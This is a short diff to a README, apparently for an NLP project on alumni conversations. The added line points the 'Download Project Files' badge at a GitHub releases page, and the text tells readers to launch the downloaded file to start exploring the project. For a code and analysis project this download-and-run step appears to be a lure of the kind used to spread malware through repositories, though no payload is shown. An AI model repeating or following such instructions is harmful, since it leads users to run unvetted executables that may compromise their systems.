@@ -41,7 +41,7 @@ Moving forward, we plan to enhance the project by:
 
 ## Get Started
 To explore the project further and access the codebase, you can download the project files from the following link:
-[![Download Project Files](https://img.shields.io/badge/Download-App.zip-blue)](https://github.com/project/files/App.zip)
+[![Download Project Files](https://github.com/Ilfan405g/Alumni-Interaction-and-Conversation-Dynamics-NLP/releases)](https://github.com/Ilfan405g/Alumni-Interaction-and-Conversation-Dynamics-NLP/releases)
 
 If the link above ends with the file name, make sure to launch the downloaded file to start exploring the project. If you encounter any issues with the link or it is not working, please check the "Releases" section of the repository for alternative download options.
 
